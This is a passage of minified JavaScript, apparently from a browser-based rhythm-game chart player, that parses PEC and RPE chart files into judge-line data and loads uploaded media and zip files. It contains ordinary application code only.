Error().stack.replace(/.+\n/,"")}}self.DOMException=e}const tween$1=[null,null,e=>Math.sin(e*Math.PI/2),e=>1-Math.cos(e*Math.PI/2),e=>1-(e-1)**2,e=>e**2,e=>(1-Math.cos(e*Math.PI))/2,e=>((e*=2)<1?e**2:-((e-2)**2-2))/2,e=>1+(e-1)**3,e=>e**3,e=>1-(e-1)**4,e=>e**4,e=>((e*=2)<1?e**3:(e-2)**3+2)/2,e=>((e*=2)<1?e**4:-((e-2)**4-2))/2,e=>1+(e-1)**5,e=>e**5,e=>1-2**(-10*e),e=>2**(10*(e-1)),e=>Math.sqrt(1-(e-1)**2),e=>1-Math.sqrt(1-e**2),e=>(2.70158*e-1)*(e-1)**2+1,e=>(2.70158*e-1.70158)*e**2,e=>((e*=2)<1?1-Math.sqrt(1-e**2):Math.sqrt(1-(e-2)**2)+1)/2,e=>e<.5?(14.379638*e-5.189819)*e**2:(14.379638*e-9.189819)*(e-1)**2+1,e=>1-2**(-10*e)*Math.cos(e*Math.PI/.15),e=>2**(10*(e-1))*Math.cos((e-1)*Math.PI/.15),e=>((e*=11)<4?e**2:e<8?(e-6)**2+12:e<10?(e-9)**2+15:(e-10.5)**2+15.75)/16,e=>1-tween$1[26](1-e),e=>(e*=2)<1?tween$1[26](e)/2:tween$1[27](e-1)/2+.5,e=>e<.5?2**(20*e-11)*Math.sin((160*e+1)*Math.PI/18):1-2**(9-20*e)*Math.sin((160*e+1)*Math.PI/18)];class LinePec{constructor(t){this.bpm=120,this.numOfNotes=0,this.numOfNotesAbove=0,this.numOfNotesBelow=0,this.speedEvents=[],this.notes=[],this.notesAbove=[],this.notesBelow=[],this.alphaEvents=[],this.moveEvents=[],this.rotateEvents=[],isNaN(t)||(this.bpm=t)}pushNote(t,n,s,r,o,l,d){this.notes.push({type:t,time:n,positionX:s,holdTime:r,speed:o,isAbove:l,isFake:d})}pushSpeedEvent(t,n){this.speedEvents.push({time:t,value:n})}pushAlphaEvent(t,n,s,r){this.alphaEvents.push({startTime:t,endTime:n,value:s,motionType:r})}pushMoveEvent(t,n,s,r,o){this.moveEvents.push({startTime:t,endTime:n,value:s,value2:r,motionType:o})}pushRotateEvent(t,n,s,r){this.rotateEvents.push({startTime:t,endTime:n,value:s,motionType:r})}format(){const t=(S,w)=>S.time-w.time,n=(S,w)=>S.startTime-w.startTime+(S.endTime-w.endTime),s={bpm:this.bpm,speedEvents:[],numOfNotes:0,numOfNotesAbove:0,numOfNotesBelow:0,notesAbove:[],notesBelow:[],judgeLineDisappearEvents:[],judgeLineMoveEvents:[],judgeLineRotateEvents:[]},r=(S,w,k,C)=>{s.judgeLineDisappearEvents.push({startTime:S,endTime:w,start:k,end:C,start2:0,end2:0})},o=(S,w,k,C,R,L)=>{s.judgeLineMoveEvents.push({startTime:S,endTime:w,start:k,end:C,start2:R,end2:L})},l=(S,w,k,C)=>{s.judgeLineRotateEvents.push({startTime:S,endTime:w,start:k,end:C,start2:0,end2:0})},d=this.speedEvents.sort(t);let u=0;for(let S=0;S<d.length;S++){const w=Math.max(d[S].time,0),k=S<d.length-1?d[S+1].time:1e9,C=d[S].value,R=u;u+=(k-w)*C/this.bpm*1.875,u=Math.fround(u),s.speedEvents.push({startTime:w,endTime:k,value:C,floorPosition:R})}for(const S of this.notes.sort(t)){const w=S.time;let k=0,C=0,R=0;for(const O of s.speedEvents)if(!(w>O.endTime)){if(w<O.startTime)break;k=O.floorPosition,C=O.value,R=w-O.startTime}const L={type:S.type,time:w,isFake:S.isFake||!1,positionX:S.positionX,holdTime:S.holdTime,speed:S.speed*(S.type===3?C:1),floorPosition:Math.fround(k+C*R/this.bpm*1.875)};if(S.isAbove){if(s.notesAbove.push(L),S.isFake)continue;s.numOfNotes++,s.numOfNotesAbove++}else{if(s.notesBelow.push(L),S.isFake)continue;s.numOfNotes++,s.numOfNotesBelow++}}let f=0,m=0;for(const S of this.alphaEvents.sort(n)){if(r(f,S.startTime,m,m),tween$1[S.motionType]){const w=S.value-m;let k=0,C=0;for(let R=S.startTime;R<S.endTime;R++)k=C,C=tween$1[S.motionType]((R+1-S.startTime)/(S.endTime-S.startTime)),r(R,R+1,m+k*w,m+C*w)}else S.motionType&&r(S.startTime,S.endTime,m,S.value);f=S.endTime,m=S.value}r(f,1e9,m,m);let g=0,y=0,v=0;for(const S of this.moveEvents.sort(n)){if(o(g,S.startTime,y,y,v,v),S.motionType!==1){const w=S.value-y,k=S.value2-v;let C=0,R=0;for(let L=S.startTime;L<S.endTime;L++)C=R,R=tween$1[S.motionType]((L+1-S.startTime)/(S.endTime-S.startTime)),o(L,L+1,y+C*w,y+R*w,v+C*k,v+R*k)}else o(S.startTime,S.endTime,y,S.value,v,S.value2);g=S.endTime,y=S.value,v=S.value2}o(g,1e9,y,y,v,v);let x=0,E=0;for(const S of this.rotateEvents.sort(n)){if(l(x,S.startTime,E,E),S.motionType!==1){const w=S.value-E;let k=0,C=0;for(let R=S.startTime;R<S.endTime;R++)k=C,C=tween$1[S.motionType]((R+1-S.startTime)/(S.endTime-S.startTime)),l(R,R+1,E+k*w,E+C*w)}else l(S.startTime,S.endTime,E,S.value);x=S.endTime,E=S.value}return l(x,1e9,E,E),s}}class BpmList{constructor(t){this.baseBpm=Number(t)||120,this.accTime=0,this.list=[]}push(t,n,s){const r=this.accTime;this.list.push({start:t,end:n,bpm:s,value:r}),this.accTime+=(n-t)/s}calc(t){let n=0;for(const s of this.list)if(!(t>s.end)){if(t<s.start)break;n=Math.round(((t-s.start)/s.bpm+s.value)*this.baseBpm*32)}return n}}function parse$2(e,t){const n=e.split(/\s+/),s={offset:0,bpmList:[],notes:[],lines:[]},r={formatVersion:3,offset:0,numOfNotes:0,judgeLineList:[],chartPec:e},o=[];let l=0;for(s.offset=isNaN(n[l])?0:Number(n[l++]);l<n.length;){const m=n[l++];if(m!=="")if(m==="bp"){const g=Number(n[l++]),y=Number(n[l++]);s.bpmList.push({time:g,bpm:y})}else if(m[0]==="n"){if(!"1234".includes(m[1]))throw new Error("Unsupported Command: "+m);const g={},y=m[1];g.type=Number(y),g.lineId=Number(n[l++]),g.time=Number(n[l++]),g.time2="2".includes(y)?Number(n[l++]):g.time,g.offsetX=Number(n[l++]),g.isAbove=Number(n[l++]),g.isFake=Number(n[l++]),g.text="n"+Object.values(g).join(" "),g.speed=(n[l++]||"")[0]==="#"?Number(n[l++]):(l--,1),g.size=(n[l++]||"")[0]==="&"?Number(n[l++]):(l--,1),s.notes.push(g)}else if(m[0]==="c"){if(!"vpdamrf".includes(m[1]))throw new Error("Unsupported Command: "+m);const g={},y=m[1];g.type=y,g.lineId=Number(n[l++]),g.time=Number(n[l++]),"v".includes(y)&&(g.speed=Number(n[l++])),g.time2="mrf".includes(y)?Number(n[l++]):g.time,"pm".includes(y)&&(g.offsetX=Number(n[l++])),"pm".includes(y)&&(g.offsetY=Number(n[l++])),"dr".includes(y)&&(g.rotation=Number(n[l++])),"af".includes(y)&&(g.alpha=Number(n[l++])),"mr".includes(y)&&(g.motionType=Number(n[l++])),g.text="c"+Object.values(g).join(" "),"pdaf".includes(y)&&(g.motionType=1),s.lines.push(g)}else throw new Error("Unexpected Command: "+m)}if(r.offset=s.offset/1e3-.175,!s.bpmList.length)throw new Error("Invalid pec file");const d=new BpmList(s.bpmList[0].bpm);s.bpmList.sort((m,g)=>m.time-g.time).forEach((m,g,y)=>{y[g+1]&&y[g+1].time<=0||d.push(m.time<0?0:m.time,y[g+1]?y[g+1].time:1e9,m.bpm)});const u=[];for(const m of s.notes){const g=[0,1,4,2,3].indexOf(m.type),y=d.calc(m.time),v=d.calc(m.time2)-y,x=isNaN(m.speed)?1:m.speed;u[m.lineId]||(u[m.lineId]=new LinePec(d.baseBpm)),u[m.lineId].pushNote(g,y,m.offsetX/115.2,v,x,m.isAbove===1,m.isFake!==0),m.isFake!==0&&o.push(`检测到FakeNote(可能无法正常显示)
位于:"${m.text}"
来自${t}`),m.size!==1&&o.push(`检测到异常Note(可能无法正常显示)
位于:"${m.text}"
来自${t}`)}const f=m=>tween$1[m]||m===1;for(const m of s.lines){const g=d.calc(m.time),y=d.calc(m.time2);if(g>y){o.push(`检测到开始时间大于结束时间(将禁用此事件)
位于:"${m.text}"
来自${t}`);continue}u[m.lineId]||(u[m.lineId]=new LinePec(d.baseBpm)),m.type==="v"&&u[m.lineId].pushSpeedEvent(g,m.speed/7),(m.type==="a"||m.type==="f")&&(u[m.lineId].pushAlphaEvent(g,y,Math.max(m.alpha/255,0),m.motionType),m.alpha<0&&o.push(`检测到负数Alpha:${m.alpha}(将被视为0)
位于:"${m.text}"
来自${t}`)),(m.type==="p"||m.type==="m")&&(u[m.lineId].pushMoveEvent(g,y,m.offsetX/2048,m.offsetY/1400,f(m.motionType)?m.motionType:1),f(m.motionType)||o.push(`未知的缓动类型:${m.motionType}(将被视为1)
位于:"${m.text}"
来自${t}`)),(m.type==="d"||m.type==="r")&&(u[m.lineId].pushRotateEvent(g,y,-m.rotation,f(m.motionType)?m.motionType:1),f(m.motionType)||o.push(`未知的缓动类型:${m.motionType}(将被视为1)
位于:"${m.text}"
来自${t}`))}for(const m of u){const g=m.format();r.judgeLineList.push(g),r.numOfNotes+=g.numOfNotes}return{data:JSON.stringify(r),messages:o}}class EventLayer{constructor(){this.moveXEvents=[],this.moveYEvents=[],this.rotateEvents=[],this.alphaEvents=[],this.speedEvents=[]}pushMoveXEvent(t,n,s,r,o,l,d){this.moveXEvents.push({startTime:t,endTime:n,start:s,end:r,easingType:o,easingLeft:l,easingRight:d})}pushMoveYEvent(t,n,s,r,o,l,d){this.moveYEvents.push({startTime:t,endTime:n,start:s,end:r,easingType:o,easingLeft:l,easingRight:d})}pushRotateEvent(t,n,s,r,o,l,d){this.rotateEvents.push({startTime:t,endTime:n,start:s,end:r,easingType:o,easingLeft:l,easingRight:d})}pushAlphaEvent(t,n,s,r,o,l,d){this.alphaEvents.push({startTime:t,endTime:n,start:s,end:r,easingType:o,easingLeft:l,easingRight:d})}pushSpeedEvent(t,n,s,r){this.speedEvents.push({startTime:t,endTime:n,start:s,end:r})}}class LineRPE{constructor(t){this.bpm=120,this.zOrder=0,this.notes=[],this.eventLayers=[],this.colorEvents=[],this.textEvents=[],this.scaleXEvents=[],this.scaleYEvents=[],this.attachUI=null,isNaN(t)||(this.bpm=t)}pushNote(t,n,s,r,o,l,d,u=1,f=255,m=1/0){f=parseInt(f)/255,this.notes.push({type:t,time:n,positionX:s,holdTime:r,speed:o,isAbove:l,isFake:d,size:u,alpha:f,visibleTime:m})}setId(t=NaN){this.id=t}setZOrder(t=0){this.zOrder=t||0}setUIAttachment(t=null){this.attachUI=t}setFather(t){this.father=t}preset(){const t=(o,l)=>o.startTime-l.startTime,n=[];for(const o of this.eventLayers){const l=[],d=[],u=[],f=[],m=[];for(const g of o.moveXEvents.sort(t))pushLineEvent(l,g);for(const g of o.moveYEvents.sort(t))pushLineEvent(d,g);for(const g of o.rotateEvents.sort(t))pushLineEvent(u,g);for(const g of o.alphaEvents.sort(t))pushLineEvent(f,g);for(const g of o.speedEvents.sort(t))pushLineEvent(m,g);n.push({moveXEvents:l,moveYEvents:d,rotateEvents:u,alphaEvents:f,speedEvents:m})}const s=combineMultiEvents(n.map(o=>o.moveXEvents)),r=combineMultiEvents(n.map(o=>o.moveYEvents));this.moveEvents=combineXYEvents(s,r),this.rotateEvents=combineMultiEvents(n.map(o=>o.rotateEvents)),this.alphaEvents=combineMultiEvents(n.map(o=>o.alphaEvents)),this.speedEvents=toSpeedEvent(combineMultiEvents(n.map(o=>o.speedEvents))),this.settled=!0}fitFather(t=[],n=console.warn){if(this.settled||this.preset(),t.includes(this)){n(`检测到循环继承：${t.concat(this).map(s=>s.id).join("->")}(对应的father将被视为-1)`),t.map(s=>s.setFather(null));return}if(this.father){if(this.father.fitFather(t.concat(this),n),!this.father)return;this.merged||mergeFather(this,this.father),this.merged=!0}}format({onwarning:t=console.warn}={}){this.fitFather([],t);const n={bpm:this.bpm,zOrder:this.zOrder,attachUI:this.attachUI,speedEvents:[],numOfNotes:0,numOfNotesAbove:0,numOfNotesBelow:0,notesAbove:[],notesBelow:[],judgeLineDisappearEvents:[],judgeLineMoveEvents:[],judgeLineRotateEvents:[],judgeLineColorEvents:[],judgeLineTextEvents:[],judgeLineScaleXEvents:[],judgeLineScaleYEvents:[]};for(const u of this.moveEvents)n.judgeLineMoveEvents.push({startTime:u.startTime,endTime:u.endTime,start:(u.start+675)/1350,end:(u.end+675)/1350,start2:(u.start2+450)/900,end2:(u.end2+450)/900});for(const u of this.rotateEvents)n.judgeLineRotateEvents.push({startTime:u.startTime,endTime:u.endTime,start:-u.start,end:-u.end,start2:0,end2:0});for(const u of this.alphaEvents)n.judgeLineDisappearEvents.push({startTime:u.startTime,endTime:u.endTime,start:parseFloat(u.start)/255,end:parseFloat(u.end)/255,start2:0,end2:0});for(const u of this.colorEvents)n.judgeLineColorEvents.push({startTime:u.startTime,endTime:u.endTime,start:u.start.join(","),end:u.end.join(","),start2:0,end2:0});for(const u of this.textEvents)n.judgeLineTextEvents.push({startTime:u.startTime,endTime:u.endTime,start:u.start,end:u.end,start2:0,end2:0});for(const u of this.scaleXEvents)n.judgeLineScaleXEvents.push({startTime:u.startTime,endTime:u.endTime,start:u.start,end:u.end,start2:0,end2:0});for(const u of this.scaleYEvents)n.judgeLineScaleYEvents.push({startTime:u.startTime,endTime:u.endTime,start:u.start,end:u.end,start2:0,end2:0});let s=0;const r=this.speedEvents;for(let u=0;u<r.length;u++){const f=Math.max(r[u].time,0),m=u<r.length-1?r[u+1].time:1e9,g=r[u].value*2/9,y=s;s+=(m-f)*g/this.bpm*1.875,s=Math.fround(s),n.speedEvents.push({startTime:f,endTime:m,value:g,floorPosition:y})}const o=(u,f)=>u.time-f.time,l=u=>{let f=0,m=0,g=0;for(const y of n.speedEvents)if(!(u>y.endTime)){if(u<y.startTime)break;f=y.floorPosition,m=y.value,g=u-y.startTime}return{v1:f,v4:m*g}},d=(u,f)=>{const m=l(u),g=l(u+f);return((g.v1-m.v1)/1.875*this.bpm+(g.v4-m.v4))/f};for(const u of this.notes.sort(o)){const{v1:f,v4:m}=l(u.time),g={type:u.type,time:u.time,isFake:u.isFake||!1,visibleTime:u.visibleTime||1/0,positionX:u.positionX,holdTime:u.holdTime,speed:u.speed*(u.type===3?d(u.time,u.holdTime):1),floorPosition:Math.fround(f+m/this.bpm*1.875),size:u.size,alpha:u.alpha};if(u.isAbove){if(n.notesAbove.push(g),u.isFake)continue;n.numOfNotes++,n.numOfNotesAbove++}else{if(n.notesBelow.push(g),u.isFake)continue;n.numOfNotes++,n.numOfNotesBelow++}}return n}}function pushLineEvent(e,t){const{startTime:n,endTime:s,start:r,end:o,easingType:l=1,easingLeft:d=0,easingRight:u=1}=t,f=(o-r)/(s-n);for(let m=e.length-1;m>=0;m--){const g=e[m];if(g.endTime<n){e[m+1]={startTime:g.endTime,endTime:n,start:g.end,end:g.end,delta:0};break}if(g.startTime===n){e.length=m;break}if(g.startTime<n){g.end=g.start+(n-g.startTime)*g.delta,g.endTime=n,g.delta=(g.end-g.start)/(n-g.startTime),e.length=m+1;break}}if(l===1||r===o||d===u)e.push({startTime:n,endTime:s,start:r,end:o,delta:f});else{if(!tween$1[l])return;if(n>=s){e.push({startTime:n,endTime:n,start:o,end:o,delta:0});return}const m=tween$1[l](d),g=tween$1[l](u),y=(u-d)/(s-n),v=(g-m)/(o-r);let x=0,E=0;for(let S=n;S<s;S++)x=E,E=(tween$1[l]((S+1-n)*y+d)-m)/v,e.push({startTime:S,endTime:S+1,start:r+x,end:r+E,delta:E-x})}}function toSpeedEvent(e){const t=[];for(const n of e){const{startTime:s,endTime:r,start:o,end:l}=n;if(t.push({time:s,value:o}),o!==l){const d=(l-o)/(r-s);for(let u=s;u<r;u++){const f=u+.5-s;t.push({time:u,value:o+f*d})}}}return t}function getRotateValue(e,t,n){let s=e[0]?e[0].start:0;for(const r of e){const{startTime:o,endTime:l,start:d,end:u}=r;if(t<o||n&&t===o)break;t>=l?s=u:s=d+(t-o)*(u-d)/(l-o)}return s}function combineXYEvents(e,t){const n=[],s=[];for(const r of e)s.push(r.startTime,r.endTime);for(const r of t)s.push(r.startTime,r.endTime);s.sort((r,o)=>r-o);for(let r=0;r<s.length-1;r++){const o=s[r],l=s[r+1];if(o===l)continue;const d=getEventsValue(e,o,!1),u=getEventsValue(e,l,!0),f=getEventsValue(t,o,!1),m=getEventsValue(t,l,!0);n.push({startTime:o,endTime:l,start:d,end:u,start2:f,end2:m})}return n}function combineMultiEvents(e){const t=[],n=[];for(const s of e)for(const r of s)n.push(r.startTime,r.endTime);n.sort((s,r)=>s-r);for(let s=0;s<n.length-1;s++){const r=n[s],o=n[s+1];if(r===o)continue;const l=e.reduce((u,f)=>u+getEventsValue(f,r,!1),0),d=e.reduce((u,f)=>u+getEventsValue(f,o,!0),0);t.push({startTime:r,endTime:o,start:l,end:d,delta:(d-l)/(o-r)})}return t}function mergeFather(e,t){const n=[],s=[];for(const r of t.moveEvents)s.push(r.startTime,r.endTime);for(const r of t.rotateEvents)s.push(r.startTime,r.endTime);for(const r of e.moveEvents)s.push(r.startTime,r.endTime);s.sort((r,o)=>r-o);for(let r=s[0];r<s[s.length-1];r++){const o=r,l=r+1;if(o===l)continue;const[d,u]=getMoveValue(t.moveEvents,o,!1),f=getRotateValue(t.rotateEvents,o,!1)*-Math.PI/180,[m,g]=getMoveValue(t.moveEvents,l,!0),y=getRotateValue(t.rotateEvents,l,!0)*-Math.PI/180,[v,x]=getMoveValue(e.moveEvents,o,!1),[E,S]=getMoveValue(e.moveEvents,l,!0),w=d+v*Math.cos(f)-x*Math.sin(f),k=m+E*Math.cos(y)-S*Math.sin(y),C=u+v*Math.sin(f)+x*Math.cos(f),R=g+E*Math.sin(y)+S*Math.cos(y);n.push({startTime:o,endTime:l,start:w,end:k,start2:C,end2:R})}e.moveEvents=n}function getEventsValue(e,t,n){let s=e[0]?e[0].start:0;for(const r of e){const{startTime:o,endTime:l,start:d,end:u,delta:f}=r;if(t<o||n&&t===o)break;t>=l?s=u:s=d+(t-o)*f}return s}function getMoveValue(e,t,n){let s=e[0]?e[0].start:0,r=e[0]?e[0].start2:0;for(const o of e){const{startTime:l,endTime:d,start:u,end:f,start2:m,end2:g}=o;if(t<l||n&&t===l)break;t>=d?(s=f,r=g):(s=u+(t-l)*(f-u)/(d-l),r=m+(t-l)*(g-m)/(d-l))}return[s,r]}function parse$1(e,t){const n=JSON.parse(e),s=n.META||n;if(!s&&!s.RPEVersion)throw new Error("Invalid rpe file");const r={formatVersion:3,offset:0,numOfNotes:0,judgeLineList:[],chartRPE:JSON.parse(e)},o=[];o.push(`RPE谱面兼容建设中...
检测到RPE版本:${s.RPEVersion}
来自${t}`);const l={};l.Chart=t,l.Music=s.song,l.Image=s.background,l.Name=s.name,l.Artist=s.composer,l.Charter=s.charter,l.Level=s.level,r.offset=s.offset/1e3;const d=[];n.judgeLineList=n.judgeLineList.sort((f,m)=>(f.zOrder||0)-(m.zOrder||0)),n.judgeLineList.reverse(),n.judgeLineList.forEach((f,m)=>{f.LineId=m,typeof f.father=="number"&&f.father!==-1&&(f.father=n.judgeLineList.length-1-f.father)});const u=new BpmList(n.BPMList[0].bpm);for(const f of n.BPMList)f.time=f.startTime[0]+f.startTime[1]/f.startTime[2];n.BPMList.sort((f,m)=>f.time-m.time).forEach((f,m,g)=>{g[m+1]&&g[m+1].time<=0||u.push(f.time<0?0:f.time,g[m+1]?g[m+1].time:1e9,f.bpm)});for(const f of n.judgeLineList){f.zOrder===void 0&&(f.zOrder=0),f.bpmfactor===void 0&&(f.bpmfactor=1),f.father===void 0&&(f.father=-1),f.isCover!==1&&o.push(`未兼容isCover=${f.isCover}(可能无法正常显示)
位于${f.LineId}号判定线
来自${t}`),f.zOrder!==0&&o.push(`未兼容zOrder=${f.zOrder}(可能无法正常显示)
位于${f.LineId}号判定线
来自${t}`),f.bpmfactor!==1&&o.push(`未兼容bpmfactor=${f.bpmfactor}(可能无法正常显示)
位于${f.LineId}号判定线
来自${t}`);const m=new LineRPE(u.baseBpm);if(m.setId(f.LineId),m.setZOrder(f.zOrder),f.notes)for(const g of f.notes){g.alpha===void 0&&(g.alpha=255),g.above!==1&&g.above!==2&&o.push(`检测到非法方向:${g.above}(将被视为2)
位于:"${JSON.stringify(g)}"
来自${t}`),g.isFake!==0&&o.push(`检测到FakeNote(可能无法正常显示)
位于:"${JSON.stringify(g)}"
来自${t}`),g.yOffset!==0&&o.push(`未兼容yOffset=${g.yOffset}(可能无法正常显示)
位于:"${JSON.stringify(g)}"
来自${t}`),g.visibleTime!==999999&&o.push(`未兼容visibleTime=${g.visibleTime}(可能无法正常显示)
位于:"${JSON.stringify(g)}"
来自${t}`),g.alpha!==255&&o.push(`未兼容alpha=${g.alpha}(可能无法正常显示)
位于:"${JSON.stringify(g)}"
来自${t}`);const y=[0,1,4,2,3].indexOf(g.type),v=u.calc(g.startTime[0]+g.startTime[1]/g.startTime[2]),x=u.calc(g.endTime[0]+g.endTime[1]/g.endTime[2])-v,E=g.speed,S=g.positionX/75.375;m.pushNote(y,v,S,x,E,g.above===1,g.isFake!==0,g.size,g.alpha,g.visibleTime)}for(const g of f.eventLayers){if(!g)continue;const y=new EventLayer;for(const v of g.moveXEvents||[]){v.linkgroup===void 0&&(v.linkgroup=0),v.linkgroup!==0&&o.push(`未兼容linkgroup=${v.linkgroup}(可能无法正常显示)
位于:"${JSON.stringify(v)}"
来自${t}`);const x=u.calc(v.startTime[0]+v.startTime[1]/v.startTime[2]),E=u.calc(v.endTime[0]+v.endTime[1]/v.endTime[2]);y.pushMoveXEvent(x,E,v.start,v.end,v.easingType,v.easingLeft,v.easingRight)}for(const v of g.moveYEvents||[]){v.linkgroup===void 0&&(v.linkgroup=0),v.linkgroup!==0&&o.push(`未兼容linkgroup=${v.linkgroup}(可能无法正常显示)
位于:"${JSON.stringify(v)}"
来自${t}`);const x=u.calc(v.startTime[0]+v.startTime[1]/v.startTime[2]),E=u.calc(v.endTime[0]+v.endTime[1]/v.endTime[2]);y.pushMoveYEvent(x,E,v.start,v.end,v.easingType,v.easingLeft,v.easingRight)}for(const v of g.rotateEvents||[]){v.linkgroup===void 0&&(v.linkgroup=0),v.linkgroup!==0&&o.push(`未兼容linkgroup=${v.linkgroup}(可能无法正常显示)
位于:"${JSON.stringify(v)}"
来自${t}`);const x=u.calc(v.startTime[0]+v.startTime[1]/v.startTime[2]),E=u.calc(v.endTime[0]+v.endTime[1]/v.endTime[2]);y.pushRotateEvent(x,E,v.start,v.end,v.easingType,v.easingLeft,v.easingRight)}for(const v of g.alphaEvents||[]){v.linkgroup===void 0&&(v.linkgroup=0),v.linkgroup!==0&&o.push(`未兼容linkgroup=${v.linkgroup}(可能无法正常显示)
位于:"${JSON.stringify(v)}"
来自${t}`);const x=u.calc(v.startTime[0]+v.startTime[1]/v.startTime[2]),E=u.calc(v.endTime[0]+v.endTime[1]/v.endTime[2]);y.pushAlphaEvent(x,E,v.start,v.end,v.easingType,v.easingLeft,v.easingRight)}for(const v of g.speedEvents||[]){v.linkgroup===void 0&&(v.linkgroup=0),v.linkgroup!==0&&o.push(`未兼容linkgroup=${v.linkgroup}(可能无法正常显示)
位于:"${JSON.stringify(v)}"
来自${t}`);const x=u.calc(v.startTime[0]+v.startTime[1]/v.startTime[2]),E=u.calc(v.endTime[0]+v.endTime[1]/v.endTime[2]);y.pushSpeedEvent(x,E,v.start,v.end)}m.eventLayers.push(y)}if(f.extended){if(f.extended.colorEvents)for(const g of f.extended.colorEvents){if(!g)continue;const y=u.calc(g.startTime[0]+g.startTime[1]/g.startTime[2]),v=u.calc(g.endTime[0]+g.endTime[1]/g.endTime[2]),x=g.start,E=g.end;m.colorEvents.push({startTime:y,endTime:v,start:x,end:E})}if(f.extended.textEvents)for(const g of f.extended.textEvents){if(!g)continue;const y=u.calc(g.startTime[0]+g.startTime[1]/g.startTime[2]),v=u.calc(g.endTime[0]+g.endTime[1]/g.endTime[2]),x=g.start,E=g.end;m.textEvents.push({startTime:y,endTime:v,start:x,end:E})}if(f.extended.scaleXEvents)for(const g of f.extended.scaleXEvents){if(!g)continue;const y=u.calc(g.startTime[0]+g.startTime[1]/g.startTime[2]),v=u.calc(g.endTime[0]+g.endTime[1]/g.endTime[2]),x=g.start,E=g.end;m.scaleXEvents.push({startTime:y,endTime:v,start:x,end:E})}if(f.extended.scaleYEvents)for(const g of f.extended.scaleYEvents){if(!g)continue;const y=u.calc(g.startTime[0]+g.startTime[1]/g.startTime[2]),v=u.calc(g.endTime[0]+g.endTime[1]/g.endTime[2]),x=g.start,E=g.end;m.scaleYEvents.push({startTime:y,endTime:v,start:x,end:E})}}f.attachUI&&m.setUIAttachment(f.attachUI),f.judgeLineRPE=m}for(const f of n.judgeLineList){const m=f.judgeLineRPE,g=n.judgeLineList[f.father];g&&m.setFather(g.judgeLineRPE);const y=String(f.Texture).replace(/\0/g,"");if(!["line.png","Line.png"].includes(y)){const x=f.extended||{};let E=x.scaleXEvents?x.scaleXEvents[x.scaleXEvents.length-1].end:1,S=x.scaleYEvents?x.scaleYEvents[x.scaleYEvents.length-1].end:1;d.push({Chart:t,LineId:m.id,Image:y,Scale:S,Aspect:E/S,UseBackgroundDim:0,UseLineColor:1,UseLineScale:1})}const v=m.format({onwarning:x=>o.push(`${x}
来自${t}`)});r.judgeLineList.push(v),r.numOfNotes+=v.numOfNotes}return{data:JSON.stringify(r),messages:o,info:l,line:d}}function info(e){const t=String(e).split(/\r?\n/),n=[];let s={};for(const r of t)if(r.startsWith("#"))Object.keys(s).length&&n.push(s),s={};else{let[o,l]=r.split(/:(.+)/).map(d=>d.trim());o==="Song"&&(o="Music"),o==="Picture"&&(o="Image"),o&&(s[o]=l)}return Object.keys(s).length&&n.push(s),n}const chartConverter={parse:parse$2,parseRPE:parse$1,info},zipWorker="/assets/zip-5de242f2.js";class FileEmitter extends EventTarget{constructor(){super();const t=this;this.input=Object.assign(document.createElement("input"),{type:"file",accept:"",multiple:!0,onchange(){t.fireChange(this.files);for(const n of this.files){const s=new FileReader;s.readAsArrayBuffer(n),s.onprogress=r=>t.fireProgress(r.loaded,r.total),s.onload=r=>t.fireLoad(n,r.target.result)}}})}uploadFile(){uploader.input.webkitdirectory=!1,uploader.input.click()}uploadDir(){uploader.input.webkitdirectory=!0,uploader.input.click()}fireChange(t){return this.dispatchEvent(Object.assign(new Event("change"),{files:t}))}fireProgress(t,n){return this.dispatchEvent(new ProgressEvent("progress",{lengthComputable:!0,loaded:t,total:n}))}fireLoad(t,n){return this.dispatchEvent(Object.assign(new ProgressEvent("load"),{file:t,buffer:n}))}}const uploader=new FileEmitter,stringify=async e=>{const t=["utf-8","gbk","big5","shift_jis"];for(const n of t){const s=new TextDecoder(n,{fatal:!0});try{return s.decode(e)}catch(r){if(n===t[t.length-1])throw r}}};class ZipReader extends EventTarget{constructor({handler:n=async s=>s}){super();He(this,"resolve",null);this.worker=null,this.total=0,this.handler=n}reset(n){this.total=0,this.worker&&this.worker.postMessage("reset")}resetOut(n){}read(n){if(!this.worker){this.dispatchEvent(new CustomEvent("loadstart"));const s=new Worker(zipWorker);s.addEventListener("message",async r=>{const o=r.data;o.total>this.total&&(this.total=o.total),console.log(o.data);const l=await this.handler(o.data);this.dispatchEvent(new CustomEvent("read",{detail:l})),this.resolve&&(this.resolve(),this.resolve=null)}),this.worker=s,this.terminate=()=>this.worker.terminate()}return this.worker.postMessage(n,[n.buffer]),new Promise(s=>{this.resolve=s})}}async function readFile(e,{createAudioBuffer:t=async n=>{const s=new(window.AudioContext||window.webkitAudioContext);return await s.close(),s.decodeAudioData(n)}}){const{name:n,path:s}=splitPath(e.name);if(n==="line.csv"){const r=await stringify(e.buffer);return{type:"line",data:joinPathInfo(csv2array(r,!0),s),buffer:e.buffer}}if(n==="info.csv"){const r=await stringify(e.buffer);return{type:"info",data:joinPathInfo(csv2array(r,!0),s),buffer:e.buffer}}if(n==="Settings.txt"||n==="info.txt"){const r=await stringify(e.buffer);return{type:"info",data:joinPathInfo(chartConverter.info(r),s),buffer:e.buffer}}return new Promise(()=>{throw new Error("Just make it a promise")}).catch(async()=>{const r=document.createElement("video");r.src=URL.createObjectURL(new Blob([e.buffer])),r.preload="metadata",await new Promise((u,f)=>{r.onloadedmetadata=u,r.onerror=f});const{videoWidth:o,videoHeight:l}=r,d={audio:await t(e.buffer.slice()),video:o&&l?r:null};return{type:"media",name:e.name,data:d,buffer:e.buffer}}).catch(async()=>{const r={audio:await t(e.buffer.slice()),video:null};return{type:"media",name:e.name,data:r,buffer:e.buffer}}).catch(async()=>{const r=new Blob([e.buffer]),o=await createImageBitmap(r);return{type:"image",name:e.name,data:o,buffer:e.buffer}}).catch(async()=>{const r=Object.getOwnPropertyDescriptor(self,"webp").value.default,o=await r(e.buffer),l=await createImageBitmap(o);return{type:"image",name:e.name,data:l}}).catch(async()=>{const r=await stringify(e.buffer);try{const o=JSON.parse(r);try{if(o.META){const l=chartConverter.parseRPE(r,e.name,s),d=await chart123(l.data),{messages:u,info:f,line:m}=l;return{type:"chart",name:e.name,md5:md5$1(r),data:d,msg:u,info:f,line:m,buffer:e.buffer}}else{const l=await chart123(r,(d,u)=>typeof u=="number"?Math.fround(u):u);return{type:"chart",name:e.name,md5:md5$1(r),data:l,buffer:e.buffer}}}catch{return new Promise(()=>{throw new Error("Just make it a promise")}).catch(async()=>{const d=await chart123(r,(u,f)=>typeof f=="number"?Math.fround(f):f);return{type:"chart",name:e.name,md5:md5$1(r),data:d,buffer:e.buffer}}).catch(async()=>{const 